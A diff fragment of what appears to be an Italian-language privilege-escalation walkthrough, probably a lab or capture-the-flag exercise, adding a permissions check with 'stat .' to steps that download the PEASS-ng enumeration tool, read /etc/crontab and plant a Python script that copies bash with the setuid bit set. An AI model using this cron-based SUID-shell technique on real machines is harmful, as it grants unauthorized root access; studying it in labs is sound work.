@@ -130,7 +130,12 @@ wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5
 ```bash
 cat /etc/crontab
 ```
+controlla i permessi della cartella
+```bash
+stat .
+```
 Vai in /scripts e crea un file random.py
+
 ```python
 import os
 os.system('cp /bin/bash /scripts/; chmod +s /scripts/bash')
